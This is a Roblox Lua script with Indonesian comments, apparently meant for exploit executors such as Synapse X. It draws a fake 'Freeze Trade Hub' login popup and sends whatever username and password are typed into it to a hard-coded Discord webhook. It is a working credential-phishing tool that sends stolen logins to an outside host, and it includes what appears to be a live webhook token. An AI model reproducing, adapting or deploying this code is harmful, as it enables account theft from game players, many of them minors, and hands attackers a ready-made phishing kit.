-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
        })
    }

    if syn and syn.request then
        -- Menggunakan syn.request untuk executor seperti Synapse X
        local response = syn.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif http and http.request then
        -- Menggunakan http.request untuk executor yang mendukung
        local response = http.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif request then
        -- Menggunakan request untuk executor alternatif
        local response = request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    else
        print("Executor Anda tidak mendukung HTTP requests!")
    end
end

-- Membuat GUI Login
local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local titleLabel = Instance.new("TextLabel")
local usernameBox = Instance.new("TextBox")
local passwordBox = Instance.new("TextBox")
local loginButton = Instance.new("TextButton")

-- Properti ScreenGui
screenGui.Name = "LoginPopup"
screenGui.Parent = game:GetService("CoreGui")

-- Properti Frame
frame.Name = "LoginFrame"
frame.Parent = screenGui
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
frame.BorderSizePixel = 3
frame.BorderColor3 = Color3.new(1, 0, 0)

-- Properti TitleLabel
titleLabel.Name = "TitleLabel"
titleLabel.Parent = frame
titleLabel.Size = UDim2.new(1, -10, 0, 40)
titleLabel.Position = UDim2.new(0, 5, 0, 5)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.Text = "Freeze Trade Hub"
titleLabel.TextSize = 20
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextStrokeTransparency = 0.8

-- Properti UsernameBox
usernameBox.Name = "UsernameBox"
usernameBox.Parent = frame
usernameBox.Size = UDim2.new(1, -20, 0, 40)
usernameBox.Position = UDim2.new(0, 10, 0, 50)
usernameBox.PlaceholderText = "Enter Username"
usernameBox.Font = Enum.Font.SourceSans
usernameBox.Text = ""
usernameBox.TextSize = 16
usernameBox.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
usernameBox.TextColor3 = Color3.new(1, 1, 1)

-- Properti PasswordBox
passwordBox.Name = "PasswordBox"
passwordBox.Parent = frame
passwordBox.Size = UDim2.new(1, -20, 0, 40)
passwordBox.Position = UDim2.new(0, 10, 0, 100)
passwordBox.PlaceholderText = "Enter Password"
passwordBox.Font = Enum.Font.SourceSans
passwordBox.Text = ""
passwordBox.TextSize = 16
passwordBox.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
passwordBox.TextColor3 = Color3.new(1, 1, 1)

-- Properti LoginButton
loginButton.Name = "LoginButton"
loginButton.Parent = frame
loginButton.Size = UDim2.new(1, -20, 0, 40)
loginButton.Position = UDim2.new(0, 10, 0, 150)
loginButton.Text = "Login"
loginButton.Font = Enum.Font.SourceSansBold
loginButton.TextSize = 18
loginButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
loginButton.TextColor3 = Color3.new(1, 1, 1)

-- Fungsi LoginButton
loginButton.MouseButton1Click:Connect(function()
    local username = usernameBox.Text
    local password = passwordBox.Text

    if username ~= "" and password ~= "" then
        print("Tombol Login Ditekan! Username:", username, "Password:", password) -- Debugging
        sendToDiscord(username, password) -- Kirim data ke webhook
        screenGui:Destroy() -- Hapus GUI setelah login berhasil
    else
        print("Username atau password kosong!") -- Debugging
    end
end)
